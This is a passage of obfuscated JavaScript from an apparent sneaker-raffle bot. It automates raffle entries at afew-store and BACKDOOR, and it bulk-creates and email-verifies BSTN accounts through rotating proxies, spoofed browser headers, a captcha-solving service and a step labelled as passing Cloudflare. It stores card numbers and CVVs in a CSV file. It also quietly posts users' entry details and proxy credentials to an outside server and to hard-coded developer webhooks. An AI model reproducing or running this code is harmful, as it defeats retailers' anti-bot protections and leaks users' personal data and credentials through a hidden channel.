                            let _0x2f576d = {
                                'method': 'GET',
                                'cookieJar': _0x14be47,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x2b5f18[0x2] + ':' + _0x2b5f18[0x3] + '@' + _0x2b5f18[0x0] + ':' + _0x2b5f18[0x1]
                            }, _0x19bbe9 = _0x21fcad['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x22361b = _0x19bbe9 + '.json', _0x2cf708 = await _0x212bbb(_0x22361b);
                            console['log'](_0x29f6be() + '\x20[' + _0x1e5ada['name'] + ']\x20Task\x20' + (_0xb56397 + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x4607ef = _0x2cf708['data']['product']['variants'];
                            if (_0x217ddf != 'RANDOM') {
                                if (_0x4607ef[0x1]['option1']['includes']('W')) {
                                    const _0x25cbd4 = _0x42281d['women']['find'](_0x231861 => _0x231861['EUsize'] === _0x217ddf);
                                    _0x25cbd4 && (_0x217ddf = _0x25cbd4['size']);
                                } else {
                                    if (_0x4607ef[0x1]['option1']['includes']('Y')) {
                                        const _0x597c81 = _0x42281d['men']['find'](_0x2bb1cf => _0x2bb1cf['EUsize'] === _0x217ddf);
                                        _0x597c81 && (_0x217ddf = _0x597c81['size'] + 'Y');
                                    } else {
                                        const _0x246a0d = _0x42281d['men']['find'](_0xd74110 => _0xd74110['EUsize'] === _0x217ddf);
                                        _0x246a0d && (_0x217ddf = _0x246a0d['size']);
                                    }
                                }
                                for (var _0x4f6a25 of _0x4607ef) {
                                    _0x4f6a25['option1'] == _0x217ddf && (_0x3f8dc3 = _0x4f6a25['id']);
                                }
                            } else {
                                var _0x122f8f = Math['round'](Math['random']() * (_0x4607ef['length'] - 0x1));
                                _0x3f8dc3 = _0x4607ef[_0x122f8f]['id'];
                            }
                            console['log'](_0x29f6be() + '\x20[' + _0x1e5ada['name'] + ']\x20Task\x20' + (_0xb56397 + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x212bbb('https://raffles.afew-store.com/cart/' + _0x3f8dc3 + ':1'), _0x3550f3 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0xe27911();
                        } catch (_0x444d4f) {
                            if (_0x444d4f['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x444d4f);
                        }
                        const _0x57ab4c = await _0x2c3b8b['newPage']();
                        await _0x57ab4c['setDefaultNavigationTimeout'](0x1d4c0), await _0x57ab4c['authenticate']({
                            'username': '' + _0x2b5f18[0x2],
                            'password': '' + _0x2b5f18[0x3]
                        }), await _0x57ab4c['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x57ab4c['setRequestInterception'](!![]), _0x57ab4c['on']('request', _0x3e56b4 => {
                            _0x3e56b4['resourceType']() === 'image' || _0x3e56b4['resourceType']() === 'font' || _0x3e56b4['resourceType']() === 'media' ? _0x3e56b4['abort']() : _0x3e56b4['continue']();
                        });
                        try {
                            await _0x57ab4c['goto'](_0x3550f3, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x29f6be() + '\x20[' + _0x1e5ada['name'] + ']\x20Task\x20' + (_0xb56397 + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x57ab4c['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x57ab4c['type']('#checkout_email', '' + _0x5c0a85[_0xb56397]['Email']), await _0x2121c3(0x320), await _0x57ab4c['type']('#checkout_attributes_instagram', '' + _0x5c0a85[_0xb56397]['Follower']), await _0x2121c3(0x320), await _0x57ab4c['select']('#checkout_shipping_address_country', '' + _0x5c0a85[_0xb56397]['Country']), await _0x57ab4c['waitForTimeout'](0x258), await _0x57ab4c['type']('#checkout_shipping_address_first_name', '' + _0x5c0a85[_0xb56397]['FirstName']), await _0x57ab4c['waitForTimeout'](0x320), await _0x57ab4c['type']('#checkout_shipping_address_last_name', '' + _0x5c0a85[_0xb56397]['LastName']), await _0x57ab4c['waitForTimeout'](0x2bc), await _0x57ab4c['type']('#checkout_shipping_address_address1', _0x5c0a85[_0xb56397]['Address1'] + '\x20' + _0x5c0a85[_0xb56397]['HouseNumber']), await _0x57ab4c['waitForTimeout'](0x2bc), await _0x57ab4c['type']('#checkout_shipping_address_address2', '' + _0x5c0a85[_0xb56397]['Address2']), await _0x57ab4c['waitForTimeout'](0x2bc), await _0x57ab4c['type']('#checkout_shipping_address_zip', '' + _0x5c0a85[_0xb56397]['Zip']), await _0x57ab4c['waitForTimeout'](0x2bc), await _0x57ab4c['type']('#checkout_shipping_address_city', '' + _0x5c0a85[_0xb56397]['City']), await _0x57ab4c['waitForTimeout'](0x2bc);
                        if (_0x5c0a85[_0xb56397]['State'] != '')
                            try {
                                const _0x564c54 = JSON['parse'](_0x190b67['readFileSync']('States.json', 'utf8'));
                                await _0x2121c3(0x1f4);
                                if (_0x5c0a85[_0xb56397]['State']['length'] > 0x2)
                                    for (let _0x51ad29 of _0x564c54) {
                                        if (_0x51ad29['Province'] == _0x5c0a85[_0xb56397]['State']) {
                                            await _0x57ab4c['select']('#checkout_shipping_address_province', _0x51ad29['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x57ab4c['select']('#checkout_shipping_address_province', _0x5c0a85[_0xb56397]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x2121c3(0x1f4), console['log'](_0x29f6be() + '\x20[' + _0x1e5ada['name'] + ']\x20Task\x20' + (_0xb56397 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x2121c3(0x190), _0x57ab4c['evaluate'](() => {
                            const _0x475be5 = document['querySelector']('#continue_button');
                            for (var _0x97d259 = 0x0; _0x97d259 < 0x5; _0x97d259++) {
                                if (_0x475be5) {
                                    _0x475be5['click'](), _0x475be5['click']();
                                    break;
                                } else
                                    _0x2121c3(0xfa0);
                            }
                        }), await _0x57ab4c['waitForTimeout'](0x9c4);
                        try {
                            await _0x57ab4c['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x57ab4c['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x593680 => _0x593680['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x57ab4c['waitForTimeout'](0x7d0), console['log'](_0x29f6be() + '\x20[' + _0x1e5ada['name'] + ']\x20Task\x20' + (_0xb56397 + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x57ab4c['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2121c3(0x3e8), await _0x57ab4c['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x3db353 => _0x3db353['submit']()), await _0x2121c3(0x3e8);
                        try {
                            await _0x57ab4c['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x57ab4c['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x2492df => _0x2492df['submit']());
                        try {
                            await _0x57ab4c['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x38c6a1 = 'no', _0x1ded45(_0x5c0a85[_0xb56397], _0x1e5ada), console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0x1e5ada['name'] + ']\x20Task\x20' + (_0xb56397 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '')
                                try {
                                    await _0x5f1090(_0x120b49['webhook'], _0x5378c8['succesDEVMSG']);
                                } catch {
                                }
                            await _0x2121c3(0xc8), await _0x5f1090(_0x1f56e1, _0x5378c8['succesDEVMSG']), await _0x2121c3(0xc8);
                            try {
                                await _0x5f1090(_0x442434, _0x5378c8['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x380ae8['replace']('#', ''),
                                    'module': _0x1e5ada['name'],
                                    'entrydata': JSON['stringify'](_0x41dd2d),
                                    'proxy': '' + _0x3e82b1[_0xb56397]
                                };
                                var _0x22bac8 = JSON['stringify'](prxdata);
                                let _0x21acd2 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x212bbb['post']('https://jraffles.herokuapp.com/success', _0x22bac8, _0x21acd2);
                            } catch (_0x53117c) {
                            }
                        } catch (_0x5cf0fb) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x5e7fc9) {
                        _0x5e7fc9['message']['includes']('selector') && (_0x5e7fc9 = 'Connection\x20Error');
                        console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x1e5ada['name'] + ']\x20Task\x20' + (_0xb56397 + 0x1) + '\x20:\x20' + _0x5e7fc9)), _0x281ca5 = '' + _0x5e7fc9;
                        var _0x94e3e0 = await _0x12b988(_0x5c0a85[_0xb56397], _0x1e5ada, 'dev', !![], _0x281ca5);
                        _0x5378c8['errorDEV'] = { 'embeds': [_0x94e3e0] }, _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x5378c8['errorDEV']), await _0x5f1090(_0x32737e, _0x5378c8['errorDEV']), _0x38c6a1 = 'yes';
                    } finally {
                        _0x2c3b8b && _0x2c3b8b['close']();
                        if (_0x38c6a1 == 'yes' && _0x43349c != 0x5 && _0x281ca5 != 'Size\x20Not\x20Found') {
                            console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x1e5ada['name'] + ']\x20Task\x20' + (_0xb56397 + 0x1) + '\x20:\x20Retrying\x20(' + _0x43349c + '\x20/\x205)')), _0xb56397 = _0xb56397 - 0x1, _0x43349c = _0x43349c + 0x1;
                            continue;
                        }
                        _0x38c6a1 == 'yes' && _0x43349c >= 0x5 && (_0x17abd2(_0x5c0a85[_0xb56397], _0x1e5ada), _0x38c6a1 = 'no', _0x43349c = 0x0);
                        if (_0xb56397 + 0x1 == _0x5c0a85['length']) {
                            await _0x2121c3(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x120b49['AfewDelay'] + '\x20ms'), await _0x2121c3(_0x120b49['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BACKDOOR\x20Botega',
        'modules': [{
            'name': 'BACKDOOR\x20Raffle\x20Entries',
            'logo': 'https://backdoor-media.s3.eu-central-1.amazonaws.com/wp-content/uploads/2021/10/10002342/logo-backdoor-bottega.png',
            'store': 'BACKDOOR',
            'function': async function (_0xb9aac5, _0x15a53d, _0x2eb338) {
                console['clear'](), console['log']('Preparing\x20BACKDOOR\x20Tasks\x20&\x20Launching\x20new\x20window..'), _0x190b67['writeFileSync']('proxies.txt', '');
                for (proxy in _0x2eb338) {
                    _0x190b67['appendFileSync']('proxies.txt', _0x2eb338[proxy] + '\x0a');
                }
                for (var _0x426976 = 0x0; _0x426976 < _0x15a53d['length']; _0x426976++) {
                    await _0x30a360(_0x15a53d, _0x426976), _0x190b67['appendFileSync']('tasks.csv', '\x0a' + _0x15a53d[_0x426976]['Url'] + ',' + _0x15a53d[_0x426976]['Size'] + ',' + _0x15a53d[_0x426976]['Email'] + ',' + _0x15a53d[_0x426976]['Password'] + ',' + _0x15a53d[_0x426976]['FirstName'] + ',' + _0x15a53d[_0x426976]['LastName'] + ',' + _0x15a53d[_0x426976]['Address1'] + ',' + _0x15a53d[_0x426976]['Address2'] + ',' + _0x15a53d[_0x426976]['HouseNumber'] + ',' + _0x15a53d[_0x426976]['Zip'] + ',' + _0x15a53d[_0x426976]['City'] + ',' + _0x15a53d[_0x426976]['Country'] + ',' + _0x15a53d[_0x426976]['State'] + ',' + _0x15a53d[_0x426976]['CardNumber'] + ',' + _0x15a53d[_0x426976]['ExpiryDate'] + ',' + _0x15a53d[_0x426976]['CVV'] + ',' + _0x15a53d[_0x426976]['NameOnCard'] + ',' + _0x15a53d[_0x426976]['Phone'] + ',' + _0x15a53d[_0x426976]['Follower']);
                }
                let _0x4d5c0b = {
                    'username': _0x380ae8,
                    'delay': _0x120b49['delay'],
                    'version': _0x3e659f,
                    'webhook': _0x120b49['webhook']
                };
                const _0x4fd431 = JSON['stringify'](_0x4d5c0b)['replace'](/"/g, '\x5c\x22');
                await _0x2121c3(0x3e8), _0x47e099('start', [
                    'cmd',
                    '/k',
                    'node\x20modules/backdoor/entry.js\x20' + _0x4fd431
                ], { 'shell': !![] });
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x24b351, _0x44f9ff, _0x12a29c) {
                    var _0x176d25 = _0x44f9ff, _0x26251e = 0x0;
                    for (var _0x57f392 = 0x0; _0x57f392 < _0x44f9ff['length']; _0x57f392++) {
                        maxTasks = Number(_0x120b49['threads']);
                        while (_0x26251e >= maxTasks) {
                            await _0x2121c3(_0x120b49['delay']);
                        }
                        async function _0x552238(_0x2924bb, _0x385f81, _0x59c2bf, _0x391923, _0x5304f5) {
                            _0x26251e++, _0x586b7d['use'](_0x41ab99()), _0x586b7d['use'](_0x1c4286({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x120b49['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x274c11;
                            try {
                                await _0x30a360(_0x385f81, _0x391923);
                            } catch {
                                retry = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x3aeb59(_0x2924bb['name'] + '\x20Task\x20' + (_0x391923 + 0x1) + '\x20/\x20' + _0x385f81['length'] + '\x20||\x20File:\x20' + _0x242415 + '\x20Proxies:\x20' + _0x38de08);
                            var _0xd623f8 = await _0x12b988(_0x385f81[_0x391923], _0x2924bb, 'acc', ![]);
                            const _0x1d4739 = { 'succesDEVMSG': { 'embeds': [_0xd623f8] } }, _0x4269cb = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x53df42 = Math['round'](Math['random']() * (_0x59c2bf['length'] - 0x1)), _0xcc2319 = _0x59c2bf[_0x53df42]['split'](':'), _0x47bf41;
                            try {
                                _0x47bf41 = await _0x586b7d['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0xcc2319[0x0] + ':' + _0xcc2319[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x47bf41 = await _0x586b7d['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0xcc2319[0x0] + ':' + _0xcc2319[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x4b446b = await _0x47bf41['newPage']();
                                await _0x4b446b['authenticate']({
                                    'username': '' + _0xcc2319[0x2],
                                    'password': '' + _0xcc2319[0x3]
                                }), console['log'](_0x29f6be() + '\x20[' + _0x2924bb['name'] + ']\x20Task\x20' + (_0x391923 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4b446b['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x4b446b['setRequestInterception'](!![]), _0x4b446b['on']('request', _0x587a0a => {
                                    _0x587a0a['resourceType']() === 'image' ? _0x587a0a['abort']() : _0x587a0a['continue']();
                                });
                                try {
                                    await _0x4b446b['goto']('' + _0x4269cb), await _0x4b446b['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x4b446b['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x29f6be() + '\x20[' + _0x2924bb['name'] + ']\x20Task\x20' + (_0x391923 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x2121c3(0x7d0), console['log'](_0x29f6be() + '\x20[' + _0x2924bb['name'] + ']\x20Task\x20' + (_0x391923 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x2121c3(0x190), await _0x4b446b['waitForSelector']('#firstname'), await _0x4b446b['focus']('#firstname'), await _0x4b446b['keyboard']['down']('Control'), await _0x4b446b['keyboard']['press']('A'), await _0x2121c3(0xc8), await _0x4b446b['keyboard']['up']('Control'), await _0x4b446b['keyboard']['press']('Backspace'), await _0x4b446b['type']('#firstname', _0x385f81[_0x391923]['FirstName'], { 'delay': 0xf0 }), await _0x2121c3(0x190), await _0x4b446b['focus']('#lastname'), await _0x4b446b['keyboard']['down']('Control'), await _0x4b446b['keyboard']['press']('A'), await _0x2121c3(0xc8), await _0x4b446b['keyboard']['up']('Control'), await _0x4b446b['keyboard']['press']('Backspace'), await _0x4b446b['type']('#lastname', _0x385f81[_0x391923]['LastName'], { 'delay': 0xe6 }), await _0x2121c3(0x190), await _0x4b446b['focus']('#email_address'), await _0x4b446b['keyboard']['down']('Control'), await _0x4b446b['keyboard']['press']('A'), await _0x2121c3(0xc8), await _0x4b446b['keyboard']['up']('Control'), await _0x4b446b['keyboard']['press']('Backspace'), await _0x4b446b['type']('#email_address', _0x385f81[_0x391923]['Email'], { 'delay': 0x122 }), await _0x2121c3(0x190), await _0x4b446b['type']('#password', _0x385f81[_0x391923]['Password'], { 'delay': 0x82 }), await _0x2121c3(0x1f4), await _0x4b446b['type']('#password-confirmation', _0x385f81[_0x391923]['Password'], { 'delay': 0x7c }), console['log'](_0x29f6be() + '\x20[' + _0x2924bb['name'] + ']\x20Task\x20' + (_0x391923 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x2121c3(0x2bc), await _0x4b446b['$eval']('#form-validate', _0x355563 => _0x355563['submit']()), await _0x2121c3(0x1388);
                                const _0x3fdab5 = await _0x4b446b['$']('#email_address-error');
                                if (_0x3fdab5)
                                    throw new Error('Invalid\x20Email');
                                const _0x37417e = await _0x4b446b['$']('#password-error');
                                if (_0x37417e)
                                    throw new Error('Invalid\x20Password');
                                await _0x4b446b['waitForSelector']('div.mesg-success'), retry = 'no', console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0x2924bb['name'] + ']\x20Task\x20' + (_0x391923 + 0x1) + '\x20:\x20Account\x20' + _0x385f81[_0x391923]['Email'] + '\x20Generated')), _0x190b67['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x385f81[_0x391923]['Email'] + ',' + _0x385f81[_0x391923]['Password']);
                                try {
                                    _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x1d4739['succesDEVMSG']);
                                } catch {
                                }
                                await _0x5f1090(_0x40cc05, _0x1d4739['succesDEVMSG']);
                                let _0x12b7bf = _0x385f81[_0x391923];
                                try {
                                    prxdata = {
                                        'username': _0x380ae8['replace']('#', ''),
                                        'module': _0x2924bb['name'],
                                        'entrydata': JSON['stringify'](_0x12b7bf),
                                        'proxy': '' + _0x59c2bf[_0x391923]
                                    };
                                    var _0x3107a5 = JSON['stringify'](prxdata);
                                    let _0x3ace2b = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x212bbb['post']('https://jraffles.herokuapp.com/success', _0x3107a5, _0x3ace2b);
                                } catch (_0x42e2b2) {
                                }
                                console['log'](_0x136200['yellow'](_0x29f6be() + '\x20[' + _0x2924bb['name'] + ']\x20Task\x20' + (_0x391923 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x51cfab) {
                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x2924bb['name'] + ']\x20Task\x20' + (_0x391923 + 0x1) + '\x20:\x20' + _0x51cfab)), _0x274c11 = '' + _0x51cfab;
                                var _0x5401d5 = await _0x12b988(_0x385f81[_0x391923], _0x2924bb, 'acc', !![], _0x274c11);
                                _0x1d4739['errorDEV'] = { 'embeds': [_0x5401d5] }, _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x1d4739['errorDEV']), await _0x5f1090(_0x32737e, _0x1d4739['errorDEV']), retry = 'yes';
                            } finally {
                                if (_0x47bf41)
                                    _0x47bf41['close']();
                                if (retry == 'yes' && _0x5304f5 < 0x5)
                                    return console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x2924bb['name'] + ']\x20Task\x20' + (_0x391923 + 0x1) + '\x20:\x20Retrying\x20(' + (_0x5304f5 + 0x1) + '\x20/\x205)')), _0x26251e--, _0x5304f5 = _0x5304f5 + 0x1, _0x552238(_0x2924bb, _0x385f81, _0x59c2bf, _0x391923, _0x5304f5);
                                retry == 'yes' && _0x5304f5 >= 0x5 && (_0x17abd2(_0x385f81[_0x391923], _0x2924bb), retry = 'no', _0x5304f5 = 0x0), _0x26251e--, console['log'](_0x29f6be() + '\x20[' + _0x2924bb['name'] + ']\x20Waiting\x20for\x20' + _0x120b49['delay'] + '\x20ms'), await _0x2121c3(_0x120b49['delay']);
                            }
                        }
                        _0x552238(_0x24b351, _0x176d25, _0x12a29c, _0x57f392, 0x0), await _0x2121c3(0x190);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x2062aa, _0x39d5b3) {
                    var _0x53cadf = ![], _0x3a51ff = [], _0x2443e3 = 0x0;
                    async function _0x508769() {
                        var _0x402c26 = new _0x548918({
                            'user': _0x120b49['masterMail'],
                            'password': _0x120b49['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x2d85b6(_0x3c7a0f) {
                            _0x402c26['openBox']('INBOX', ![], _0x3c7a0f);
                        }
                        _0x402c26['once']('ready', function () {
                            _0x2d85b6(function (_0xe5eddf, _0x9551b2) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0xe5eddf)
                                    throw _0xe5eddf;
                                _0x402c26['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x3ff30c, _0x5b0cf9) {
                                    if (!_0x5b0cf9 || !_0x5b0cf9['length'])
                                        console['log'](_0x29f6be() + '\x20[' + _0x2062aa['name'] + ']\x20No\x20mails\x20found'), _0x402c26['end']();
                                    else {
                                        var _0x5ee512 = _0x402c26['seq']['fetch'](_0x5b0cf9, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x5ee512['on']('message', function (_0x4f5b77, _0x65a3cb) {
                                            var _0x3dc9b8 = '(#' + _0x65a3cb + ')\x20';
                                            _0x4f5b77['on']('body', function (_0x487a59, _0x4f221e) {
                                                _0x26bd25(_0x487a59, (_0x5d02b7, _0x21c6bb) => {
                                                    var _0x4ed112 = _0x21c6bb['text']['split']('customer/account/confirm/')[0x1], _0x1c156a = _0x4ed112['split'](']')[0x0], _0x4a818b = _0x1c156a['split']('>')[0x0];
                                                    _0x3a51ff['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x4a818b);
                                                });
                                            }), _0x4f5b77['once']('end', function () {
                                            });
                                        }), _0x5ee512['once']('error', function (_0x228ea0) {
                                            console['log']('Fetch\x20error:\x20' + _0x228ea0), _0x53cadf = !![];
                                        }), _0x5ee512['once']('end', function () {
                                            _0x402c26['end'](), _0x53cadf = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x402c26['once']('error', function (_0x159ce4) {
                            console['log'](_0x136200['red'](_0x159ce4['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x53cadf = !![];
                        }), _0x402c26['once']('end', async function () {
                            _0x53cadf = !![];
                        }), _0x402c26['connect']();
                    }
                    try {
                        _0x508769();
                        while (!_0x53cadf) {
                            await _0x2121c3(0xfa0);
                        }
                        console['log']('Found\x20' + _0x3a51ff['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x2121c3(0x7d0);
                    }
                    for (var _0x898dc3 = 0x0; _0x898dc3 < _0x3a51ff['length']; _0x898dc3++) {
                        maxTasks = Number(_0x120b49['threads']);
                        while (_0x2443e3 >= maxTasks) {
                            await _0x2121c3(_0x120b49['delay']);
                        }
                        async function _0xc0124f(_0x413c29, _0xdf7ce1, _0x4d06c9, _0x147a40, _0x1f1e8c) {
                            _0x2443e3++, _0x586b7d['use'](_0x41ab99());
                            if (_0x15dc65 != 'yes')
                                var _0x15dc65 = '', _0x1f1e8c = 0x0;
                            var _0x13ca19 = Math['round'](Math['random']() * (_0x4d06c9['length'] - 0x1)), _0x25c615 = _0x4d06c9[_0x13ca19]['split'](':'), _0x20fec1;
                            try {
                                _0x20fec1 = await _0x586b7d['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x25c615[0x0] + ':' + _0x25c615[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x20fec1 = await _0x586b7d['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x25c615[0x0] + ':' + _0x25c615[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x886b5b = await _0x20fec1['newPage']();
                                await _0x886b5b['authenticate']({
                                    'username': '' + _0x25c615[0x2],
                                    'password': '' + _0x25c615[0x3]
                                }), console['log'](_0x29f6be() + '\x20[' + _0x413c29['name'] + ']\x20Task\x20' + (_0x147a40 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x886b5b['setRequestInterception'](!![]), _0x886b5b['on']('request', _0x3a5da7 => {
                                    _0x3a5da7['resourceType']() === 'image' ? _0x3a5da7['abort']() : _0x3a5da7['continue']();
                                }), console['log'](_0x29f6be() + '\x20[' + _0x413c29['name'] + ']\x20Task\x20' + (_0x147a40 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x886b5b['goto'](_0xdf7ce1[_0x147a40]);
                                } catch (_0x1b40e2) {
                                    _0x15dc65 = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x1b40e2);
                                }
                                console['log'](_0x29f6be() + '\x20[' + _0x413c29['name'] + ']\x20Task\x20' + (_0x147a40 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x886b5b['waitForTimeout'](0xbb8);
                                try {
                                    await _0x886b5b['waitForSelector']('.account-nav'), _0x15dc65 = 'no', console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0x413c29['name'] + ']\x20Task\x20' + (_0x147a40 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x57f50f = await _0x12b988(null, _0x413c29, 'ver', ![]);
                                    const _0x20b753 = { 'succesDEVMSG': { 'embeds': [_0x57f50f] } };
                                    await _0x5f1090(_0x3fb3ca, _0x20b753['succesDEVMSG']);
                                } catch {
                                    _0x15dc65 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x39194f) {
                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x413c29['name'] + ']\x20Task\x20' + (_0x147a40 + 0x1) + '\x20:\x20' + _0x39194f));
                                var _0x5e07d2 = _0x39194f, _0x520e47 = await _0x12b988(null, _0x413c29, 'ver', !![], _0x5e07d2);
                                const _0x5bb088 = { 'errorDEVMSG': { 'embeds': [_0x520e47] } };
